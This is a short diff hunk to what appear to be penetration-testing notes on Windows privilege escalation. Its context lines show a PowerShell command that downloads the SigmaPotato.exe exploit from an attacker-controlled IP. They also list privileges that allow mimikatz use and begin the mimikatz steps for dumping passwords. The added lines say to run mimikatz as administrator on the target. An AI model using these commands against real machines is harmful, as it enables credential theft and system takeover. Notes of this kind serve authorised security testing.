@@ -33,6 +33,9 @@ iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
 If a user has either of the following privileges, mimikatz can be used:
 * SeImpersonatePrivilege
 * SeDebugPrivilege
+
+Once mimikatz is transferred to the target windows device, run it as administrator via powershell.
+
 Enable SeDebugPrivilege (require for dumping passwords):
 ```
 privilege::debug
